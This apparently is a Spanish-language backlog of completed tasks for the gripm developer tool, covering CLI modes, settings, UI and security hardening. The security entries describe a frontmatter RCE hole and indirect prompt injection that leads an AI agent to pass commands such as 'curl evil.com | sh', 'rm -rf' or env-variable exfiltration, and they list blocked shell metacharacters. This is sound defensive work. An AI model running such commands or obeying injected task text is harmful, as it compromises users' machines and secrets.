#### [DEV-240] Intercambiabilidad de modos --single y --hub en runtime y persistencia activa del proyecto demo
- **Prioridad**: `high` | **Tipo**: `bug`

Tras ejecutar la inicialización de un repositorio mediante `gripm --init`, las opciones de runtime `--single` y `--hub` (o `--multi`) no funcionaban de forma intercambiable y la experiencia con el proyecto Demo presentaba fallas de activación y persistencia:
1. **Conflicto de Precedencia CLI vs. Configuración Local:** Al iniciar el servidor web, `src/App.tsx` subordinaba la bandera `singleProject` a la configuración estática `.gripm/config.json` (`config.mode === 'single'`), ignorando la bandera CLI `--hub` recibida por el servidor y ocultando el selector de proyectos.
2. **Sobreescritura Incondicional de `activeProjectId`:** En `vite.config.ts`, la función `getRegistry()` sobreescribía `reg.activeProjectId = existingLocal.id` en cada petición HTTP si detectaba el repositorio local actual, revirtiendo inmediatamente cualquier selección del usuario hacia el proyecto demo u otro proyecto del Hub.
3. **Resolución Rígida de `activeProject`:** En `vite.config.ts`, la resolución del proyecto activo priorizaba la ruta del sistema de archivos sobre `registry.activeProjectId`, impidiendo que el backend despachara las tareas y metadatos del proyecto demo en modo Hub.
4. **Flags de CLI en `bin/gripm.js`:** La ejecución sin banderas (`gripm`) forzaba incondicionalmente `process.env.GRIPM_MODE = 'single'`, impidiendo que proyectos configurados con modo hub en `.gripm/config.json` funcionaran adecuadamente al invocar el binario directamente.

### Solución

1. **Precedencia canónica en CLI (`bin/gripm.js`):**
   - `--hub` / `--multi` establece `GRIPM_MODE = 'multi'`.
   - `--single` establece `GRIPM_MODE = 'single'`.
   - Ejecución sin banderas elimina `GRIPM_MODE` para permitir que el servidor derive el modo desde `.gripm/config.json` o la cantidad de proyectos en el registro.
2. **Preservación de identidad activa en `vite.config.ts`:**
   - En `getRegistry()`, solo se asigna `reg.activeProjectId = existingLocal.id` si `reg.activeProjectId` no estaba previamente definido.
   - En la resolución de `activeProject`, en modo Hub (`!isSingleMode`) se prioriza `registry.activeProjectId`, despachando el proyecto demo y sus tareas completas.
3. **Precedencia de runtime en cliente (`src/App.tsx`):**
   - El prop `singleProject` de `Header` consume prioritariamente `boardData.singleProject`, respondiendo dinámicamente a la bandera del CLI.
   - Ante eventos SSE `settings_changed`, se revalida `loadData(true)` para reflejar cambios de modo en caliente.
4. **Badge diferenciado en Header (`src/components/Header.tsx`):**
   - Si se ejecuta en modo mono-proyecto sobre el proyecto demo, se muestra la etiqueta "Demo" en lugar de "Local".

**Criterios de Aceptación:**
- [x] #1 bin/gripm.js respeta flags CLI --single y --hub explícitas y no fuerza single en ejecuciones sin banderas
- [x] #2 vite.config.ts preserva registry.activeProjectId sin sobreescribirlo con el repo local en cada petición
- [x] #3 vite.config.ts en modo hub resuelve activeProject desde registry.activeProjectId permitiendo visualizar proyecto demo
- [x] #4 src/App.tsx prioriza boardData.singleProject sobre config.mode permitiendo alternar --single y --hub en runtime
- [x] #5 Header.tsx distingue badge 'Demo' vs 'Local' en modo singleProject
- [x] #6 Pruebas automatizadas validan la precedencia de flags CLI y la activación del proyecto demo

---

#### [DEV-241] Consistencia condicional de configuraciones segun modulos y add-ons activos
- **Prioridad**: `high` | **Tipo**: `bug`

Garantizar coherencia total en la vista de configuración (`SettingsView`):
1. **Disponibilidad condicional según módulos instalados/activos:** Solo exponer configuraciones correspondientes a módulos habilitados en *Módulos & Add-ons* (o seleccionados en el onboarding de `--init`).
2. **Metodologías acopladas al módulo Sprints:** Cuando el módulo Sprints está inactivo (`enabledTabs.sprint === false`), las metodologías Scrum y Scrumban se deshabilitan visual y funcionalmente (mostrando badge de advertencia y tooltip/descripción informativa), forzando y preservando la metodología en `kanban`.
3. **Vistas predeterminadas consistentes:** Las opciones de vista inicial (`sprint`, `release`) quedan deshabilitadas si sus respectivos módulos están inactivos, con fallback automático a `kanban` para evitar pantallas inaccesibles o rotas.
4. **Pestañas visibles en cabecera:** Reflejar inequívocamente el estado de los módulos de Sprints y Releases en la sección de pestañas superiores, deshabilitando su conmutación individual cuando el módulo raíz está desactivado e informando al usuario sobre su activación en *Módulos & Add-ons*.

**Criterios de Aceptación:**
- [x] #1 Scrum y Scrumban quedan visual y funcionalmente deshabilitados en Workflow & Views cuando el modulo Sprints esta inactivo
- [x] #2 La vista predeterminada no permite seleccionar Sprints o Releases si sus modulos correspondientes estan inactivos y hace fallback limpio a kanban
- [x] #3 La seccion de pestanas visibles en cabecera bloquea conmutadores de modulos inactivos con indicacion explicita
- [x] #4 Al desactivar modulos en Modulos & Add-ons, el estado local y persistido ajusta automaticamente methodology y defaultView sin provocar inconsistencias
- [x] #5 Suite de pruebas y Piramide de Verificacion pasan con codigo 0

---

#### [DEV-242] Remediacion integral de seguridad Fase 2: erradicacion de RCE en frontmatter y auditoria MCP (SEC-01 a SEC-10)
- **Prioridad**: `high` | **Tipo**: `bug`

Implementación y certificación de la **Fase 2 de Seguridad** definida en la auditoría integral de `@gripm/board@1.1.0` (`docs/archive/auditoria-2026-10-10.md` §4 y §11.2):

1. **SEC-01 · Ejecución ciega de comandos persistidos en frontmatter:**
   El Gatekeeper de `scripts/mcp-server.ts` leía `verifyCommand` desde `rawExtraFrontmatter` del archivo Markdown en disco y lo persistía tras cada transición. Cualquier tarea con comandos shell maliciosos en su frontmatter lograba ejecución de código (RCE) en la máquina del próximo agente o usuario al transicionar a `ready` o `done`. Se erradica la lectura ciega desde disco y la persistencia de scripts en los archivos Markdown.
2. **SEC-02 · Mutación silenciosa y fabricación de ACs en `gripm_sync_backlog`:**
   El parámetro `autoFix` tenía valor por defecto `true`, alterando `- [ ]` a `- [x]` sin verificación real en tareas `done`. Se establece `autoFix` en `false` por defecto (modo seguro/solo lectura de auditoría).
3. **SEC-03 · Contención de rutas en `--repo` del servidor MCP:**
   Validar contención de la ruta `--repo` contra límites del sistema para impedir traversals o rutas no autorizadas.
4. **SEC-05 · Validación estricta de `inputSchema` en herramientas MCP:**
   Validar parámetros en `handleToolCall` (tipos numéricos, límites y rangos en `limit`, `toggleAcIndex`), rechazando valores inválidos con error descriptivo en lugar de fallos silenciosos.
5. **SEC-08 · Higiene en `verify-publish-surface.js` y detección multiplataforma:**
   Eliminar el path privado del autor hardcodeado en la fuente del verificador y extender las expresiones regulares de fuga de rutas de usuario para cubrir Windows (`C:\Users\...`) y Linux (`/home/...`).
6. **SEC-09 · Trazabilidad auditable en bypass `force: true`:**
   Registrar advertencia explícita y metadata de auditoría cuando se salten las validaciones del Gatekeeper mediante `force: true`.
7. **SEC-06, SEC-07, SEC-10 · Declaración explícita de superficie de riesgo:**
   Crear documento canónico `SECURITY.md` y documentar en `AGENTS.md` el modelo de amenazas, la frontera stdio, la exposición en `--host 0.0.0.0` y las garantías del Gatekeeper.

**Criterios de Aceptación:**
- [x] #1 scripts/mcp-server.ts nunca ejecuta verifyCommand proveniente del frontmatter de un archivo en disco (SEC-01)
- [x] #2 scripts/mcp-server.ts nunca persiste comandos shell ejecutables en el frontmatter de los archivos .md (SEC-01)
- [x] #3 gripm_sync_backlog opera con autoFix: false por defecto y no muta ACs ni tareas sin opt-in explícito (SEC-02)
- [x] #4 scripts/mcp-server.ts valida contención y existencia de --repo impidiendo escape a rutas del sistema (SEC-03)
- [x] #5 handleToolCall valida tipos y rangos de argumentos (limit, toggleAcIndex) retornando errores explícitos (SEC-05)
- [x] #6 verify-publish-surface.js no hardcodea rutas privadas de autores y detecta rutas absolutas de Windows, Linux y macOS (SEC-08)
- [x] #7 El uso de force: true emite advertencia explícita de auditoría en la respuesta del Gatekeeper (SEC-09)
- [x] #8 SECURITY.md y AGENTS.md documentan formalmente la superficie de riesgo, modelo de amenazas y mitigaciones (SEC-06, SEC-07, SEC-10)
- [x] #9 Pruebas automatizadas en scripts/verify-mcp-binary.js y scripts/test-api-security.js validan todas las mitigaciones con código 0

---

#### [DEV-243] Security headers en UI dev server (CSP, frame-ancestors, nosniff), fuentes locales y limite de body HTTP (413)
- **Prioridad**: `high` | **Tipo**: `feature`

Implementación de mitigaciones de seguridad en el dev server y capa UI de gripm identificadas en la auditoría técnica de seguridad:

1. **Security Headers & Anti-Clickjacking:**
   - Inyección de cabeceras de seguridad en respuestas del middleware de `vite.config.ts`:
     - `Content-Security-Policy`: con directivas estrictas (`default-src 'self'`, `frame-ancestors 'none'`, `object-src 'none'`).
     - `X-Frame-Options: DENY`: impide que sitios web maliciosos embeban `http://localhost:4100` en iframes para ataques de clickjacking.
     - `X-Content-Type-Options: nosniff`: previene MIME-sniffing de scripts o estilos.
     - `Referrer-Policy: strict-origin-when-cross-origin`: protege la fuga de rutas internas en cabeceras Referer.

2. **Privacidad y Soporte Offline (Self-hosted Fonts):**
   - Retirar enlaces externos a Google Fonts (`fonts.googleapis.com` y `fonts.gstatic.com`) de `index.html`.
   - Utilizar tipografías locales/autohospedadas o font-stack moderna del sistema, permitiendo que gripm sea 100% utilizable offline y sin telemetría de navegación hacia servidores de terceros.

3. **Límite de Tamaño de Body HTTP (Anti-DoS local):**
   - Incorporar guarda `MAX_BODY_SIZE = 10 * 1024 * 1024` (10 MB) en el acumulador de `req.on('data')` en `vite.config.ts`.
   - Responder inmediatamente con `413 Payload Too Large` y destruir el flujo si la carga supera el límite, previniendo DoS por agotamiento de memoria (OOM).

4. **Regresión y Verificación Automatizada:**
   - Ampliar `scripts/test-api-security.js` con aserciones ejecutables contra el middleware real para todas las cabeceras y el límite de body 413.

**Criterios de Aceptación:**
- [x] #1 vite.config.ts inyecta cabeceras de seguridad (CSP, X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy) en respuestas HTTP
- [x] #2 CSP declara frame-ancestors 'none' bloqueando clickjacking en localhost
- [x] #3 index.html no realiza peticiones externas a Google Fonts utilizando tipografías locales o del sistema
- [x] #4 vite.config.ts valida tamaño máximo del body (MAX_BODY_SIZE = 10MB) respondiendo 413 Payload Too Large si se excede
- [x] #5 scripts/test-api-security.js incluye pruebas automatizadas para CSP, frame-ancestors, nosniff y límite 413 de body
- [x] #6 Pirámide de verificación en verde (tsc, npm test, backlog:sync, backlog:check, publish:check, build)

---

#### [DEV-244] Endurecimiento de verifyCommand en Gatekeeper MCP contra prompt injection (allowlist de scripts package.json y anti-subshell)
- **Prioridad**: `high` | **Tipo**: `bug`

Endurecimiento del Gatekeeper de ejecución de verificación en `scripts/mcp-server.ts`:

Aunque la Fase 2 (DEV-242 / SEC-01) erradicó la lectura ciega de comandos desde el frontmatter YAML en disco, un agente de IA que sea inducido mediante prompt injection indirecto (por ejemplo, a través de instrucciones maliciosas en el título o descripción de una tarea externa) podría pasar un comando shell arbitrario destructivo en el argumento `verifyCommand` (`curl evil.com | sh`, `rm -rf`, exfiltración de variables de entorno).

Para mitigar este vector:
1. **Restricción a scripts de `package.json` o binarios autorizados:**
   - `verifyCommand` solo puede invocar scripts existentes en el `package.json` del repositorio (`npm test`, `npm run <script>`, `npx <allowed-tool>`).
2. **Rechazo estricto de metacaracteres shell:**
   - Prohibir operadores de tubería, encadenamiento y redirección (`|`, `&`, `;`, `` ` ``, `$()`, `<`, `>`).
3. **Validación previa sin ejecución:**
   - Si el comando contiene caracteres prohibidos o no coincide con los scripts autorizados, el Gatekeeper rechaza la transición de inmediato con un error descriptivo sin invocar subshells.

**Criterios de Aceptación:**
- [x] #1 scripts/mcp-server.ts restringe verifyCommand exclusivamente a scripts definidos en package.json (npm test, npm run <script>) o comandos de allowlist segura
- [x] #2 Rechazo estricto de metacaracteres de encadenamiento o subshell (| & ; ` $() < >) en verifyCommand
- [x] #3 Invocaciones con comandos no autorizados devuelven error descriptivo del Gatekeeper antes de spawnear cualquier proceso
- [x] #4 scripts/verify-mcp-binary.js incluye pruebas automatizadas de rechazo ante inyección de comandos en verifyCommand
- [x] #5 Pirámide de verificación en verde (tsc, npm test, backlog:sync, backlog:check, publish:check, build)

---

#### [DEV-245] Autenticacion por token efimero en escucha LAN (--host 0.0.0.0)
- **Prioridad**: `high` | **Tipo**: `feature`

Aislamiento de acceso en redes de área local (LAN) cuando el servidor se ejecuta con `--host 0.0.0.0`:

Cuando gripm corre escuchando en `0.0.0.0`, cualquier dispositivo de la LAN puede conectarse a la IP del host y acceder o mutar el backlog sin restricciones. Para permitir previsualización móvil en redes Wi-Fi sin exponer el backlog a otros participantes de la red:
1. Al arrancar con `0.0.0.0`, el daemon genera un token criptográfico efímero en memoria (`crypto.randomBytes(16)`).
2. Se muestra en consola la URL con el token pre-cargado: `http://<ip-lan>:4100/?token=<token>`.
3. Peticiones que se originen desde interfaces externas requieren el token en query param (`?token=...`) o cabecera `X-Gripm-Token`.
4. El tráfico local en loopback (`127.0.0.1` / `localhost`) se mantiene transparente sin exigir token para no degradar la ergonomía de desarrollo local.

**Criterios de Aceptación:**
- [x] #1 Al iniciar con --host 0.0.0.0, genera un token efímero aleatorio en memoria e imprime URL de acceso en consola
- [x] #2 Peticiones mutantes y lecturas de backlog desde IPs externas exigen token respondiendo 401 Unauthorized si falta o es inválido
- [x] #3 Peticiones en loopback (127.0.0.1 / localhost) mantienen acceso transparente sin fricción
- [x] #4 UI web almacena y reenvía el token si fue provisto en la URL inicial
- [x] #5 Pruebas en test-api-security.js validan rechazo 401 en LAN sin token y 200 con token

---

#### [DEV-246] Endurecimiento de DevSecOps en GitHub Actions (SCA audit, permissions minimos y anti-script-injection en publish)
- **Prioridad**: `medium` | **Tipo**: `chore`

Endurecimiento de la cadena de suministro y workflows de CI/CD en `.github/workflows/`:

1. **Principio de menor privilegio en workflows:**
   - Establecer `permissions: contents: read` a nivel global en `ci.yml` y `publish.yml` para impedir que tokens de Actions tengan permisos excesivos de escritura por defecto.
2. **SCA (Software Composition Analysis):**
   - Incorporar paso automatizado de `npm audit` en `ci.yml` (`npm run audit:deps`) para bloquear vulnerabilidades críticas en dependencias.
3. **Erradicación de Script Injection en Workflows:**
   - En `publish.yml`, evitar interpolación directa `${{ github.event.inputs.tag }}` en scripts de shell; canalizar inputs a través de variables de entorno seguras (`env: INPUT_TAG: ${{ github.event.inputs.tag }}`).

**Criterios de Aceptación:**
- [x] #1 ci.yml y publish.yml declaran bloque permissions: contents: read a nivel de workflow
- [x] #2 ci.yml incorpora paso de SCA (npm audit --audit-level=high)
- [x] #3 publish.yml pasa inputs de dispatch mediante bloque env: en lugar de interpolación directa en script bash
- [x] #4 Verificación local de sintaxis y coherencia de pipelines

---

#### [DEV-247] Épica: Sistema Integral de Estimación de Tareas (Story Points y T-Shirt Sizes)
- **Prioridad**: `high` | **Tipo**: `epic`

Épica paraguas para la incorporación del sistema integral de estimación de tareas en Gripm, permitiendo dimensionar el esfuerzo del backlog bajo estándares ágiles de la industria (Story Points con secuencia Fibonacci o T-Shirt Sizes por tallas cualitativas).

Esta épica agrupa y coordina cuatro fases de entrega técnica y de producto:
1. **DEV-136 (Configuración y Soberanía):** Activación/desactivación en `SettingsView`, elección de método (Fibonacci vs T-Shirt), previsualización de escalas y persistencia reactiva en configuración.
2. **DEV-137 (Modelo de Dominio, Persistencia y MCP):** Soporte del campo `estimate` en frontmatter Markdown (`estimate: 5`), parser y serializador en `backlogMdParser.ts`, middleware API y contratos en herramientas MCP (`gripm_create_task`, `gripm_update_task`, `gripm_get_task`, `gripm_list_tasks`).
3. **DEV-138 (UI/UX en Cockpit):** Selector de estimación en `ItemModal` con feedback visual interactivo y renderizado de badges de estimación en las tarjetas Kanban (`ItemCard`).
4. **DEV-139 (Métricas Ágiles y Filtros):** Agregación de puntos/tallas en `SprintView` (velocidad, capacidad, total de puntos por estado/columna), vista tabular de Backlog y filtrado avanzado por estimación en `FilterBar`.

### Regla de Ciclo de Vida:
Como épica contenedora:
- Entra en `doing` tan pronto como cualquiera de las tareas hijas (`DEV-136` a `DEV-139`) inicie su desarrollo activo.
- Pasa a `review` una vez que las 4 tareas hijas alcancen el estado `ready` para la verificación y auditoría integral de la funcionalidad.

**Criterios de Aceptación:**
- [x] #1 DEV-136 completada y certificada: activación soberana, selección de escala Fibonacci/T-Shirt y persistencia en configuración
- [x] #2 DEV-137 completada y certificada: modelo tipado en BacklogItem, persistencia del campo estimate en Markdown y soporte completo en MCP
- [x] #3 DEV-138 completada y certificada: edición intuitiva en ItemModal y badges visuales accesibles en tarjetas Kanban
- [x] #4 DEV-139 completada y certificada: métricas agregadas por columna y sprint en SprintView y filtros avanzados por estimación
- [x] #5 La épica pasa a review y ready únicamente tras la certificación de la Pirámide de Verificación en las cuatro tareas hijas

---

#### [DEV-248] Gestión Visual de Tareas Hijas en Épicas e Iniciativas con Desvinculación Bidireccional Directa
- **Prioridad**: `high` | **Tipo**: `feature`

Cuando un ítem en DevBoard/Gripm es de tipo contenedor de alto nivel (`type === 'epic'` o `type === 'initiative'`), el cockpit debe brindar visibilidad completa de su desglose de trabajo y permitir la administración directa de sus tareas hijas desde la vista de detalle (`ItemModal`):

### 1. Panel de Tareas Hijas en ItemModal:
- Detectar dinámicamente si el ítem actual es de tipo `epic` o `initiative` (o si existen ítems en el backlog que declaran `parentId === item.id` o `epic === item.id / item.code`).
- Mostrar una sección dedicada **"Tareas Hijas" / "Child Tasks"** con la lista de ítems dependientes.
- Para cada tarea hija, renderizar sus datos más relevantes:
  - Identificador único (`code` o `id`, ej: `DEV-136`).
  - Tipo con su icono y color (`feature`, `bug`, `ux`, etc.).
  - Título descriptivo (truncado con elipsis limpia si excede el ancho pero accesible por title/tooltip).
  - Badge de Estado actual con su color semántico (`draft`, `doing`, `ready`, etc.).
  - Prioridad e indicador de estimación / asignado si existen.
- Clic en la fila de la tarea hija abre directamente dicho ítem en el modal para navegación fluida entre niveles jerárquicos.

### 2. Desvinculación Bidireccional Directa:
- Cada fila de la lista de hijas cuenta con un botón o acción explícita de **desvincular** (`Quitar relación` / icono de unlink o `X`).
- Al ejecutar la acción desde la vista de la épica/iniciativa padre:
  - Se remueve la relación en el ítem hijo (estableciendo `parentId: ''` y `parent: ''` en su definición).
  - La actualización persiste en disco de forma atómica y reactiva.
  - La lista de hijas del padre y su barra de progreso rollup (`epicProgress`) se actualizan instantáneamente sin recargar la aplicación.

**Criterios de Aceptación:**
- [x] #1 En ItemModal, cuando el ítem sea de tipo 'epic' o 'initiative' (o tenga tareas asociadas con parentId/epic), renderizar la sección 'Tareas Hijas' con la lista completa de ítems dependientes
- [x] #2 Cada tarea hija en la lista muestra sus datos más relevantes: ID/código, icono y badge de tipo, título descriptivo, badge de estado con color semántico y prioridad
- [x] #3 Permitir abrir el ItemModal de la tarea hija al hacer clic sobre su fila en la lista para navegación jerárquica directa
- [x] #4 Incluir botón de desvinculación rápida en cada fila de tarea hija que limpie la propiedad parentId en el archivo del hijo y persista el cambio vía API/disco
- [x] #5 La desvinculación reactiva actualiza la vista del padre y recalcula las métricas de progreso rollup (epicProgress) sin requerir recarga
- [x] #6 Pirámide de verificación pasa en verde: tsc, npm test, backlog:check y publish:check

---

#### [DEV-249] Tolerancia a CRLF en verify-changes y actualizacion de selector de pestana Sprints en test-ui
- **Prioridad**: `high` | **Tipo**: `bug`

Resolución de dos fallos en el pipeline de GitHub Actions (`ci.yml`):

1. **Falso positivo de `U+D` en `scripts/verify-changes.js` en runner `windows-latest`:**
   - En runners Windows, Git realiza el checkout por defecto con CRLF (`\r\n`).
   - `checkCorruption` dividía por `\n`, dejando el retorno de carro `\r` (0x0D / 13) al final de cada línea, evaluando erróneamente `code < 0x20 && code !== 0x09` como verdadero y reportando falso positivo `carácter de control U+D` en cada línea de cada archivo del repositorio.
   - Mitigación: Normalización en `checkCorruption` descartando `\r` final (`replace(/\r$/, '')`), exclusión explícita de `0x0d` y `0x0a` de la condición de caracteres de control, y creación de `.gitattributes` con `* text=auto eol=lf` para estandarizar checkout en LF.

2. **Timeout en `scripts/test-ui-smoke.js` en runner `ubuntu-latest`:**
   - La pestaña de Sprints en Header (`src/components/Header.tsx`) utiliza la etiqueta localizada `header.sprints` ("Sprints").
   - El test de smoke usaba un regex estricto `/^(Sprints & Backlog|Sprints y Backlog)$/` que no contemplaba "Sprints".
   - Mitigación: Actualización del regex a `/^(Sprints & Backlog|Sprints y Backlog|Sprints)$/`.

**Criterios de Aceptación:**
- [x] #1 `scripts/verify-changes.js` no reporta falsos positivos de `U+D` en archivos con terminaciones de línea CRLF.
- [x] #2 `.gitattributes` existe en la raíz y define `* text=auto eol=lf` para consistencia cross-platform.
- [x] #3 `scripts/test-ui-smoke.js` localiza correctamente la pestaña de Sprints mediante `/^(Sprints & Backlog|Sprints y Backlog|Sprints)$/`.
- [x] #4 `node scripts/verify-changes.js --all` pasa con código de salida 0.
- [x] #5 La suite completa `npm test` y el check de sincronización `npm run backlog:check` pasan en verde.

---

#### [DEV-250] Desacople de Gripm Playbook en el onboarding de gripm init y superficie limpia de Gripm Board
- **Prioridad**: `high` | **Tipo**: `feature`

Alinear el onboarding de `@gripm/board` (`gripm --init`) y su superficie de publicación para erradicar la apariencia de duplicación o "fork a plena vista" con `gripm-playbook`, consolidando los siguientes puntos:

1. **Denominación Canónica Unificada:**
   Erradicar todas las referencias residuales a "Agentic Team Playbook" en el código, CLI y documentación, unificando bajo el nombre de producto oficial: **Gripm Playbook** (`@gripm/playbook`).

2. **Onboarding Opcional y Limpio (`gripm --init` / `runInitWizard`):**
   Incorporar en el asistente interactivo de inicialización (`scripts/initScaffold.js`) la pregunta explícita:
   `¿Deseas instalar también Gripm Playbook (@gripm/playbook) con roles de equipo de agentes (PM, Principal Engineer, QA, Designer) y auditoría de UX? (s/N)`
   - Si el usuario rechaza (default `N` o perfil minimalista): el proyecto consumidor queda **100% limpio**. Solo se configuran `backlog/tasks/`, `.gripm/config.json` y la skill de conexión `.agents/skills/gripm/SKILL.md`. No se descargan ni inyectan roles, scripts de auditoría ni templates de sprint ajenos.
   - Si el usuario acepta: se ejecuta la sincronización de `@gripm/playbook` en ese momento (invocando el sincronizador o `npx @gripm/playbook sync`).

3. **Superficie de Distribución Limpia (`package.json` de Gripm Board):**
   En el campo `files` de `package.json`, acotar `".agents"` a `".agents/skills/gripm"` (más templates necesarios en `scripts/templates/`). Gripm Board no debe distribuir en su tarball de npm las skills internas del Playbook (`principal-engineer`, `rigorous-qa-auditor`, etc.) que viven en el repo únicamente por dogfooding de desarrollo propio.

4. **Clarificación y Limpieza en el Repositorio `gripm`:**
   Documentar en `AGENTS.md` y `docs/` que las skills de Playbook presentes en `.agents/skills/` del repositorio `gripm` residen allí en calidad de dogfooding metodológico para el desarrollo del producto, no como código fuente de Gripm Board.

**Criterios de Aceptación:**
- [x] #1 El asistente de inicialización scripts/initScaffold.js pregunta explícitamente si se desea instalar Gripm Playbook, dejando el proyecto completamente limpio si se responde que no.
- [x] #2 Si el usuario acepta instalar Gripm Playbook en el init, se dispara la instalación/sincronización canónica de @gripm/playbook.
- [x] #3 package.json acota su campo files para incluir únicamente .agents/skills/gripm en lugar del comodín .agents completo, verificado por verify-publish-surface.js.
- [x] #4 Todas las menciones residuales de 'Agentic Team Playbook' en CLI, scripts y documentación viva se unifican a 'Gripm Playbook'.
- [x] #5 Se documenta formalmente la frontera entre el producto Gripm Board (Cockpit/MCP) y Gripm Playbook (framework metodológico), aclarando el rol del dogfooding en el repo gripm.
- [x] #6 Pirámide de verificación en verde (npx tsc --noEmit, npm test, npm run backlog:check, npm run publish:check con código 0).

---

#### [DEV-251] Saneamiento de READMEs: retiro de badge y enlace a demo inexistente en Vercel
- **Prioridad**: `high` | **Tipo**: `bug`

Retirar el badge y el párrafo de demostración interactiva que referenciaban a `https://gripm.vercel.app` en `README.md` y `README.es.md`:
1. La funcionalidad pertenece a la tarea DEV-222, la cual continúa en estado `draft` sin código ni infraestructura de despliegue en Vercel.
2. Evitar promesas de producto no existentes y enlaces rotos en la portada pública del repositorio en GitHub.

**Criterios de Aceptación:**
- [x] #1 Removido badge de Live Sandbox en Vercel de README.md
- [x] #2 Removido bloque con enlace a gripm.vercel.app de README.md
- [x] #3 Removido badge de Demo en Vivo en Vercel de README.es.md
- [x] #4 Removido bloque con enlace a gripm.vercel.app de README.es.md
- [x] #5 npm run backlog:check y npm test pasan con código 0

---

#### [DEV-252] Rediseño y estandarización visual de interfaz CLI según lineamientos modernos
- **Prioridad**: `high` | **Tipo**: `feature`

Rediseñar la interfaz de terminal (CLI) de gripm adoptando los estándares de la industria (Command Line Interface Guidelines - clig.dev, Vite, Next.js):
1. Erradicar las cajas Unicode cerradas y fijas con emojis que se descuadran en terminales como PowerShell y Windows Terminal debido a discrepancias en el ancho de caracteres de fuentes monoespaciadas.
2. Adoptar una jerarquía visual limpia y abierta con sangría consistente, punteros sobrios (`➜`), etiquetas atenuadas y valores clave destacados (URL local y proyecto).
3. Eliminar la saturación de emojis decorativos ("emoji soup") en banners de bienvenida y wizards de scaffolding, priorizando la señal sobre el ruido.
4. Respetar entornos sin color (`NO_COLOR` / no-TTY) y garantizar robustez entre plataformas (Windows, Linux, macOS).

**Criterios de Aceptación:**
- [x] #1 Erradicada la caja rígida cerrada y la sopa de emojis en el banner de arranque en bin/gripm.js a favor de un diseño limpio estilo Vite/Next.js
- [x] #2 Banner de arranque destaca la URL local y ruta del proyecto con sangría consistente y formateo ANSI semántico respetando NO_COLOR y TTY
- [x] #3 Modernizados los avisos de actualización y mensajes de scripts/initScaffold.js y scripts/uninstall.js sin recuadros rígidos quebradizos
- [x] #4 Preservada la compatibilidad con todas las opciones CLI (--repo, --port, --init, --help, mcp, playbook) y suites de prueba existentes
- [x] #5 Pirámide de Verificación completa en verde (tsc --noEmit, npm test, backlog:check, verify-changes)

---

#### [DEV-253] Optimizaciones de UX: ergonomía de estimación, contraste de filtros y desacople de tema en módulos
- **Prioridad**: `high` | **Tipo**: `bug`

Corrección integral de defectos de experiencia de usuario, contraste y ergonomía visual identificados en uso real:
1. Alto contraste en desplegables de filtros avanzados (Sprint, Release, Módulo) bajo modo oscuro en Chromium/Windows mediante fondos opacos y estilizado nativo de opciones.
2. Aislamiento e inmunidad del tema visual al interactuar con switches de módulos y add-ons en Configuración (Sprints, Releases, Hub, Calendar), erradicando el cambio forzado a dark mode.
3. Desacople del estado del input manual de estimación en ItemModal, eliminando la colisión de foco y vaciado de campo al tipear valores compuestos (como 55 u 89).
4. Disposición horizontal en una sola línea para pantallas de 1366px con presets canónicos de Planning Poker (0 a 21) y pastilla inline compacta.
5. Corrección de relaciones jerárquicas hacia la épica DEV-233 y guardias de módulos activos en tarjetas Kanban.

**Criterios de Aceptación:**
- [x] #1 Desplegables de filtros en AdvancedFiltersPopover cuentan con fondo opaco #131c2f, borde slate-700/80, chevron pointer-events-none y opciones estilizadas con alto contraste en dark mode
- [x] #2 Switches de Modules & Add-ons en SettingsView preservan el tema activo (light/dark/system) sin forzar el modo oscuro al persistir cambios
- [x] #3 Campo manual de estimación en ItemModal desacopla su estado local customEstimateInput, permitiendo tipear dígitos arbitrarios (55, 89) sin vaciar el input ni activar botones superiores
- [x] #4 Selector de estimación encaja al 100% en una sola línea horizontal en resolución 1366px gracias a DEFAULT_FIBONACCI hasta 21 y pastilla compacta
- [x] #5 Tareas hijas de DEV-233 vinculadas formalmente y chips de módulos en ItemCard protegidos por flags de activación
- [x] #6 Pirámide de verificación en verde (tsc, audit-ux-code, npm test de 16 pasos y npm run build)

---

#### [DEV-254] Modal de consulta y ayuda de atajos de teclado (Cheat Sheet y disparador ?)
- **Prioridad**: `high` | **Tipo**: `feature`

Implementación del diálogo modal accesible de ayuda y consulta de atajos de teclado (Cheat Sheet):
1. Componente `KeyboardShortcutsModal` con categorías claras (Navegación, Tareas y Acciones, Búsqueda y Modales), badges de teclas estéticos (`<kbd>`) y soporte bilingüe (español e inglés).
2. Apertura universal con la tecla `?` (o `Shift + /`) cuando el usuario no se encuentra escribiendo dentro de inputs, textareas o elementos editables.
3. Botón de acceso directo en el `Header` (versión escritorio junto a los controles de tema/idioma y en el cajón de menú móvil) con ícono de teclado y etiquetas accesibles.
4. Integración estricta con el primitivo accesible `Modal` (`createPortal`, `role="dialog"`, `aria-modal`) y `useFocusTrap` para retorno de foco y cierre con `Esc`.
5. Inclusión en la suite de verificación de trampa de foco (`scripts/verify-focus-trap.js`).

**Criterios de Aceptación:**
- [x] #1 Componente KeyboardShortcutsModal implementado con primitivo Modal y useFocusTrap, estructurado en categorías (Navegación, Tareas y Acciones, Búsqueda y Modales) con badges kbd
- [x] #2 Presionar la tecla ? (Shift + /) fuera de campos de texto abre el modal de atajos de teclado
- [x] #3 Botón accesible con ícono de teclado en Header (escritorio y menú móvil) permite abrir el modal con un clic
- [x] #4 Soporte completo de traducción en es.json y en.json para todos los textos del modal y botones
- [x] #5 Integrado en scripts/verify-focus-trap.js y pirámide de verificación en verde (tsc, audit:ux, npm test)

---

#### [DEV-255] Command Palette global y buscador de acciones rápidas (⌘K)
- **Prioridad**: `medium` | **Tipo**: `feature`

Diseño e implementación de una Command Palette interactiva global (estilo Linear, Raycast o GitHub) activada con `⌘K` o `Ctrl+K`:
1. Modal flotante central con buscador difuso de alta velocidad.
2. Salto directo a tareas (`DEV-XXX`) y apertura inmediata de su modal de edición con Enter.
3. Menú de acciones rápidas ejecutables: cambiar de vista (Tablero, Sprints, Releases, Papelera, Configuración), alternar tema (Claro/Oscuro), cambiar idioma, sincronizar backlog con /docs, cambiar proyecto activo y crear nueva tarea.
4. Navegación completa por teclado con flechas `↑` y `↓`, selección con `Enter` y cierre con `Escape`.
5. Filtro de comandos por categorías (Navegación, Tareas, Proyectos, Ajustes).

**Criterios de Aceptación:**
- [x] #1 Atajo ⌘K / Ctrl+K abre el modal flotante de Command Palette en lugar de enfocar únicamente el input de filtros
- [x] #2 Buscador filtra en tiempo real tareas existentes y comandos de acción rápida
- [x] #3 Permite navegar por la lista de resultados con teclas de flecha y ejecutar la acción seleccionada con Enter
